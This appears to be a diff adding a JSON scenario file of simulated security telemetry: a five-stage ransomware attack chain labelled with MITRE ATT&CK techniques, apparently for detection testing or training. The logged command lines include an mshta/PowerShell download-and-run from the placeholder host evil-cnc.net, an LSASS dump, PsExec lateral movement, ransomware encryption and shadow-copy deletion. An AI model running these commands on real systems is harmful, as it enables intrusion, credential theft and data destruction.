@@ -1,0 +1,246 @@
+[
+  {
+    "name": "Stage 1 - Delivery via ClickFix Social Engineering",
+    "delay": 0.2,
+    "events": [
+      {
+        "source": "mdo_email",
+        "event_type": "email_event",
+        "sender": "support@pdf-editor-pro.com",
+        "recipient": "{{RANDOM_EMAIL}}",
+        "subject": "Quick invoice review — pending payment",
+        "attachment_verdict": "Malicious",
+        "detection_method": "Heuristic",
+        "delivery_location": "Inbox",
+        "direction": "Inbound",
+        "spf_pass": true,
+        "dkim_pass": false,
+        "dmarc_pass": false,
+        "sender_ip": "{{CNC_IP}}",
+        "AccountName": "{{RANDOM_USER}}",
+        "mitre": {
+          "tactic": "Initial Access",
+          "technique_id": "T1566.001",
+          "technique_name": "Spearphishing Attachment"
+        },
+        "is_malicious": true,
+        "killchain_phase": "initial-access"
+      },
+      {
+        "source": "endpoint",
+        "event_type": "process_creation",
+        "ActionType": "ProcessCreated",
+        "FileName": "mshta.exe",
+        "FolderPath": "C:\\Windows\\System32",
+        "ProcessId": "{{RANDOM_PID}}",
+        "ProcessCommandLine": "mshta.exe \"javascript:new ActiveXObject('WScript.Shell').Run('powershell.exe -Command \\\"Invoke-WebRequest -Uri https://evil-cnc.net/installer.ps1 -OutFile $env:temp\\b.exe; Start-Process $env:temp\\b.exe\\\"',0,false);\"",
+        "AccountName": "{{RANDOM_USER}}",
+        "DeviceName": "{{RANDOM_HOST}}",
+        "integrity_level": "Medium",
+        "token_elevation": "TokenElevationTypeLimited",
+        "parent_process_name": "outlook.exe",
+        "is_malicious": true,
+        "mitre": {
+          "tactic": "Execution",
+          "technique_id": "T1204.002",
+          "technique_name": "User Execution: Malicious File"
+        },
+        "killchain_phase": "execution"
+      }
+    ]
+  },
+  {
+    "name": "Stage 2 - RMM Tool Deployment (BeyondTrust)",
+    "delay": 1.5,
+    "events": [
+      {
+        "source": "endpoint",
+        "event_type": "process_creation",
+        "ActionType": "ProcessCreated",
+        "FileName": "BeyondTrust_Remote_Support.exe",
+        "FolderPath": "C:\\Users\\{{RANDOM_USER}}\\AppData\\Local\\Temp",
+        "ProcessId": "{{RANDOM_PID}}",
+        "ProcessCommandLine": "BeyondTrust_Remote_Support.exe /SILENT /VERYSILENT /SUPPRESSMSGBOXES /NORESTART",
+        "AccountName": "{{RANDOM_USER}}",
+        "DeviceName": "{{RANDOM_HOST}}",
+        "is_malicious": true,
+        "mitre": {
+          "tactic": "Execution",
+          "technique_id": "T1219",
+          "technique_name": "Remote Access Software"
+        },
+        "killchain_phase": "execution"
+      },
+      {
+        "source": "endpoint_network",
+        "event_type": "network_connection",
+        "DeviceAction": "allowed",
+        "Protocol": "TCP",
+        "SourcePort": "{{RANDOM_PORT}}",
+        "DestinationPort": 443,
+        "DestinationIP": "{{CNC_IP}}",
+        "DeviceName": "{{RANDOM_HOST}}",
+        "AccountName": "{{RANDOM_USER}}",
+        "is_malicious": true,
+        "mitre": {
+          "tactic": "Command and Control",
+          "technique_id": "T1219",
+          "technique_name": "Remote Access Software"
+        },
+        "killchain_phase": "command-and-control"
+      }
+    ]
+  },
+  {
+    "name": "Stage 3 - Discovery & Credential Harvesting via RMM",
+    "delay": 3.0,
+    "events": [
+      {
+        "source": "endpoint",
+        "event_type": "process_creation",
+        "ActionType": "ProcessCreated",
+        "FileName": "cmd.exe",
+        "FolderPath": "C:\\Windows\\System32",
+        "ProcessId": "{{RANDOM_PID}}",
+        "ProcessCommandLine": "cmd.exe /c net group \"Domain Admins\" /domain",
+        "AccountName": "Administrator",
+        "DeviceName": "{{RANDOM_HOST}}",
+        "parent_process_name": "BeyondTrust_Remote_Support.exe",
+        "integrity_level": "High",
+        "is_malicious": true,
+        "mitre": {
+          "tactic": "Discovery",
+          "technique_id": "T1069.002",
+          "technique_name": "Permission Groups Discovery: Domain Groups"
+        },
+        "killchain_phase": "discovery"
+      },
+      {
+        "source": "endpoint",
+        "event_type": "process_creation",
+        "ActionType": "ProcessCreated",
+        "FileName": "procdump64.exe",
+        "FolderPath": "C:\\Users\\Administrator\\AppData\\Local\\Temp",
+        "ProcessId": "{{RANDOM_PID}}",
+        "ProcessCommandLine": "procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Administrator\\AppData\\Local\\Temp\\lsass.dmp",
+        "AccountName": "SYSTEM",
+        "DeviceName": "{{RANDOM_HOST}}",
+        "parent_process_name": "BeyondTrust_Remote_Support.exe",
+        "is_malicious": true,
+        "mitre": {
+          "tactic": "Credential Access",
+          "technique_id": "T1003.001",
+          "technique_name": "OS Credential Dumping: LSASS Memory"
+        },
+        "killchain_phase": "credential-access"
+      }
+    ]
+  },
+  {
+    "name": "Stage 4 - Lateral Movement via RMM Tunnel",
+    "delay": 2.0,
+    "events": [
+      {
+        "source": "endpoint",
+        "event_type": "process_creation",
+        "ActionType": "ProcessCreated",
+        "FileName": "psexec.exe",
+        "FolderPath": "C:\\Windows\\Temp",
+        "ProcessId": "{{RANDOM_PID}}",
+        "ProcessCommandLine": "psexec.exe \\\\{{RANDOM_IP}} -u litware\\administrator -p [REDACTED] -s cmd.exe /c \"start C:\\Windows\\Temp\\BeyondTrust_Remote_Support.exe /SILENT\"",
+        "AccountName": "SYSTEM",
+        "DeviceName": "{{RANDOM_HOST}}",
+        "parent_process_name": "BeyondTrust_Remote_Support.exe",
+        "is_malicious": true,
+        "mitre": {
+          "tactic": "Lateral Movement",
+          "technique_id": "T1021.002",
+          "technique_name": "Remote Services: SMB/Windows Admin Shares"
+        },
+        "killchain_phase": "lateral-movement"
+      },
+      {
+        "source": "firewall",
+        "event_type": "network_connection",
+        "DeviceAction": "allowed",
+        "Protocol": "TCP",
+        "SourcePort": "{{RANDOM_PORT}}",
+        "DestinationPort": 445,
+        "DestinationIP": "{{RANDOM_IP}}",
+        "DeviceName": "{{RANDOM_HOST}}",
+        "is_malicious": true,
+        "mitre": {
+          "tactic": "Lateral Movement",
+          "technique_id": "T1021.002",
+          "technique_name": "Remote Services: SMB/Windows Admin Shares"
+        },
+        "killchain_phase": "lateral-movement"
+      }
+    ]
+  },
+  {
+    "name": "Stage 5 - Ransomware Deployment via RMM",
+    "delay": 3.0,
+    "events": [
+      {
+        "source": "endpoint",
+        "event_type": "process_creation",
+        "ActionType": "ProcessCreated",
+        "FileName": "locker.exe",
+        "FolderPath": "C:\\Windows\\Temp",
+        "ProcessId": "{{RANDOM_PID}}",
+        "ProcessCommandLine": "locker.exe /encrypt C:\\Users\\ /network /delete-vss /note=\"Your files are encrypted. Contact: ransom@onionmail.org\"",
+        "AccountName": "SYSTEM",
+        "DeviceName": "{{RANDOM_HOST}}",
+        "parent_process_name": "BeyondTrust_Remote_Support.exe",
+        "integrity_level": "System",
+        "is_malicious": true,
+        "mitre": {
+          "tactic": "Impact",
+          "technique_id": "T1486",
+          "technique_name": "Data Encrypted for Impact"
+        },
+        "killchain_phase": "impact"
+      },
+      {
+        "source": "endpoint",
+        "event_type": "process_creation",
+        "ActionType": "ProcessCreated",
+        "FileName": "vssadmin.exe",
+        "FolderPath": "C:\\Windows\\System32",
+        "ProcessId": "{{RANDOM_PID}}",
+        "ProcessCommandLine": "vssadmin.exe delete shadows /all /quiet",
+        "AccountName": "SYSTEM",
+        "DeviceName": "{{RANDOM_HOST}}",
+        "is_malicious": true,
+        "mitre": {
+          "tactic": "Impact",
+          "technique_id": "T1490",
+          "technique_name": "Inhibit System Recovery"
+        },
+        "killchain_phase": "impact"
+      },
+      {
+        "source": "security_alert",
+        "event_type": "security_alert",
+        "alert_name": "RMM Tool Abuse - Unauthorized Remote Access Software Detected",
+        "alert_type": "C2-Malware",
+        "severity": "Critical",
+        "description": "BeyondTrust Remote Support (Unsigned) installed on {{RANDOM_HOST}} without authorized change request. Process tree: outlook.exe -> mshta.exe -> powershell.exe -> BeyondTrust_Remote_Support.exe. Followed by domain admin enumeration, lsass dump, lateral movement via PsExec, and ransomware deployment. Full RMM-abuse killchain observed.",
+        "confidence_level": "High",
+        "confidence_score": 0.97,
+        "tactics": "['Execution', 'Command and Control', 'Credential Access', 'Lateral Movement', 'Impact']",
+        "techniques": "['T1204.002', 'T1219', 'T1003.001', 'T1021.002', 'T1486', 'T1490']",
+        "compromised_entity": "{{RANDOM_HOST}}",
+        "remediation_steps": "Block unauthorized RMM tools at network perimeter, isolate affected endpoints, revoke domain admin creds, review BeyondTrust logs for session details, initiate incident response",
+        "mitre": {
+          "tactic": "Command and Control",
+          "technique_id": "T1219",
+          "technique_name": "Remote Access Software"
+        },
+        "is_malicious": true,
+        "killchain_phase": "command-and-control"
+      }
+    ]
+  }
+]
